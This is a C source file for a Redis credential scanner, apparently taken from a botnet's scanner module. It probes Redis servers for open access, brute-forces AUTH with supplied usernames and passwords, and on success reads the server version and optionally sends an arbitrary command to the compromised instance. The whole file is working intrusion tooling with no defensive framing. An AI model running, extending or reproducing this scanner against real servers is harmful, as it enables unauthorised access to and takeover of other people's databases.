/* redis.c -- Redis credential scanner (single-target-try)
   Extracted from bot/scanner_redis.c, scaffolding removed. */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>

#include "redis.h"
#include "../core/util.h"

/* Send a RESP command and read response line */
static int redis_cmd(int fd, const char *cmd, char *resp, int respsz) {
    int n;
    if (send(fd, cmd, strlen(cmd), MSG_NOSIGNAL) <= 0) return -1;
    n = (int)recv(fd, resp, (size_t)(respsz - 1), 0);
    if (n <= 0) return -1;
    resp[n] = '\0';
    return n;
}

int redis_check_open(const char *ip, const redis_opts_t *opts) {
    char resp[256];
    int fd;

    fd = tcp_connect(ip, opts->port, opts->timeout);
    if (fd < 0) return -1;

    if (redis_cmd(fd, "*1\r\n$4\r\nPING\r\n", resp, sizeof(resp)) > 0) {
        if (strncmp(resp, "+PONG", 5) == 0) {
            close(fd);
            return 1; /* open instance */
        }
    }

    close(fd);
    return 0; /* auth required */
}

int redis_try(const char *ip, const char *user, const char *pass,
              const redis_opts_t *opts, char *version_out, int versz) {
    char cmd[512], resp[1024];
    int fd;

    if (version_out && versz > 0) version_out[0] = '\0';

    fd = tcp_connect(ip, opts->port, opts->timeout);
    if (fd < 0) return -1;

    /* Build AUTH command (RESP protocol for binary-safe passwords) */
    if (user && user[0]) {
        /* ACL auth (Redis 6+): AUTH username password */
        snprintf(cmd, sizeof(cmd), "*3\r\n$4\r\nAUTH\r\n$%d\r\n%s\r\n$%d\r\n%s\r\n",
                 (int)strlen(user), user, (int)strlen(pass), pass);
    } else {
        /* Legacy auth: AUTH password */
        snprintf(cmd, sizeof(cmd), "*2\r\n$4\r\nAUTH\r\n$%d\r\n%s\r\n",
                 (int)strlen(pass), pass);
    }

    if (redis_cmd(fd, cmd, resp, sizeof(resp)) <= 0) {
        close(fd);
        return -1;
    }

    if (strncmp(resp, "+OK", 3) != 0) {
        close(fd);
        return 0; /* miss */
    }

    /* Hit -- fetch version info */
    if (version_out && versz > 0) {
        if (redis_cmd(fd, "*2\r\n$4\r\nINFO\r\n$6\r\nserver\r\n", resp, sizeof(resp)) > 0) {
            char *rv = strstr(resp, "redis_version:");
            if (rv) {
                rv += 14;
                char *nl = strchr(rv, '\r');
                if (!nl) nl = strchr(rv, '\n');
                if (nl) {
                    size_t vl = (size_t)(nl - rv);
                    if (vl >= (size_t)versz) vl = (size_t)(versz - 1);
                    memcpy(version_out, rv, vl);
                    version_out[vl] = '\0';
                }
            }
        }
    }

    /* Optional exec command */
    if (opts->exec_cmd && opts->exec_cmd[0]) {
        snprintf(cmd, sizeof(cmd), "%s\r\n", opts->exec_cmd);
        redis_cmd(fd, cmd, resp, sizeof(resp));
    }

    close(fd);
    return 1; /* hit */
}
